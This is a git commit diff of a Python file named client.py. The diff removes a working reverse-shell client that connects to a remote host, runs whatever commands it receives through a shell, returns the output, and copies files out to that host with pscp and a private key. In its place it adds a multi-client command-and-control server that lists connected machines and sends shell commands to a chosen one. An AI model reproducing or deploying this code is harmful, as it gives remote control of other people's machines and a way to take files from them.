b708ae2cba6f94f75e3ae46345828be51ce406e7
Chyavan M C <chyavan.mc4@gmail.com>
2019-04-14 23:10:22 +0530

    Update client.py

--- client.py
+++ client.py
@@ -1,40 +1,121 @@
-import os
-import socket
-import subprocess
 import sys
+import socket
+import threading
+from queue import Queue
+import time
 
-s = socket.socket()
-host_name = 'WebsiteNameHere.com'
-host = socket.gethostbyname(host_name)  #Or directly input IP address here
-port = 9999         #Same port as defined by server
-s.connect((host, port))
+connections = []
+addresses = []
 
-while True:
+
+def create_socket():        # create socket
     try:
-        data = s.recv(1024)
+        global host
+        global port
+        global s
+        host = ''
+        port = 9999
+        s = socket.socket()
+    except socket.error as msg:
+        print("Socket creation error:", str(msg))
 
-        if data[:6].decode("utf-8") == 'backup':
-            filename = data[7:].decode("utf-8")
-            d_current = os.getcwd()
-            d_key = os.path.abspath(os.path.dirname(sys.argv[0]))
-            sshID = "ubuntu@" + host_name
-            data = "pscp -i " + str(d_key) + "\PrivateKeyFile.ppk " + str(d_current) + "\\" + filename + " " + sshID +\
-                   ":/home/ubuntu/" + filename
-            cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-                                   stdin=subprocess.PIPE)
-            outputStr = str(cmd.stdout.read() + cmd.stderr.read(), "utf-8")
-            s.send(str.encode(outputStr + str(os.getcwd()) + '> '))
 
-        else:
-            if data[:2].decode("utf-8") == 'cd':
-                os.chdir(data[3:].decode("utf-8"))
-                data = ''.encode("utf-8")
+def bind_socket():          # Bind socket to port
+    try:
+        s.bind((host, port))
+        s.listen(5)
+        print("Socket binded and listening for connections")
+    except socket.error as msg:
+        print("Binding error:", str(msg))
+        bind_socket()
 
-            if len(data) >= 0:
-                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-                                       stdin=subprocess.PIPE)
-                outputStr = str(cmd.stdout.read() + cmd.stderr.read(), "utf-8")
-                s.send(str.encode(outputStr + str(os.getcwd())+'> '))
-                # print(outputStr)
+
+def accept_connections():       # Accept multiple clients
+    for c in connections:
+        c.close()
+    connections.clear()
+    addresses.clear()
+    while True:
+        try:
+            conn, address = s.accept()
+            #conn.setblocking(True)
+            connections.append(conn)
+            addresses.append(address)
+        except:
+            pass
+
+
+def start_control():
+    while True:
+        print("\nlist: Lists all the connections\nselect x: Selects x-th connection from the list\nexit: Exits the program")
+        cmd = input('Multi-Client-Server>')
+        if cmd == 'list':
+            list_connections()
+        elif cmd[:6] == 'select':
+            conn = get_target(cmd)
+            if conn is not None:
+                send_commands(conn)
+            else:
+                print("Couldn't select the connection!\n")
+                list_connections()
+
+
+def list_connections():
+    val = ''
+    for i, conn in enumerate(connections):
+        try:
+            conn.send(str.encode(" "))
+            conn.recv(65536)
+        except:
+            del connections[i]
+            continue
+        val += str(i) + "\t" + str(addresses[i][0]) + ":" + str(addresses[i][1]) + "\n"
+    print("-----------------Clients-----------------\n"+val+"\n")
+
+
+def get_target(cmd):
+    try:
+        num = int(cmd.replace('select ',''))
+        print("Connected to ",str(addresses[num][0]))
+        print(str(addresses[num][0])+">",end="")
+        return connections[num]
     except:
-        break
+        return
+
+
+def send_commands(conn):
+    while True:
+        try:
+            cmd = input()
+            if cmd.lower() == 'exit' or cmd.lower() == 'quit':
+                break
+
+            elif len(str.encode(cmd)) > 0:
+                conn.send(str.encode(cmd))
+                response = str(conn.recv(65536),"utf-8")
+                print(response, end="")
+
+        except:
+            print("Connection lost!")
+            break
+
+
+def connection_thread():
+    create_socket()
+    bind_socket()
+    accept_connections()
+
+
+def command_thread():
+    start_control()
+
+
+def main():
+    t1 = threading.Thread(target=connection_thread)
+    t2 = threading.Thread(target=command_thread)
+    t1.start()
+    time.sleep(1)
+    t2.start()
+
+
+main()
